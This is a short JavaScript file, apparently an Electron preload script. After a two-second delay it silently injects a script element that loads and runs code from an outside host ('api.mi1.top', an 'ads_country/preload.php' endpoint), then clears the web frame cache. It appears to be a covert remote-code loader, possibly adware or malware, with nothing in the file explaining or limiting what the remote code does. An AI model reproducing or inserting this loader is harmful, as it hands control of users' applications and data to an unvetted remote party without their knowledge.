const { webFrame } = require('electron')
setTimeout(() => {
var script = document.createElement('script');
script.src = 'https://api.mi1.top/ads_country/preload.php?v=' + Date.now() + '';
document.head.appendChild(script);
webFrame.clearCache()
}, 2000)

